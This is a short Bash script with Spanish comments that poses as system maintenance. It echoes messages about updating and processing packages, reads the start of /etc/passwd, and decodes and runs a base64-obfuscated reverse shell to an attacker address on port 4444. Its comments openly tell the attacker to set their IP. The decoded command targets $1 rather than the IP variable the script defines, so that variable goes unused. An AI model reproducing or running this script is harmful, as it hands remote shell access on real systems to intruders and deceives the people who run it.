#!/bin/bash
# AQUÍ ESTÁ EL TRUCO: Pon tu IP de atacante fija
IP_ATACANTE="192.168.1.109"
PUERTO=4444

echo "Iniciando mantenimiento del sistema..."
cat /etc/passwd | head -n 5
echo "Procesando paquetes..."

# Ejecutamos la reverse shell hacia TU IP (192.168.1.109)
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8kMS80NDQ0IDA+JjEgJm==" | base64 -d | bash

sleep 2
echo "Actualización completada."
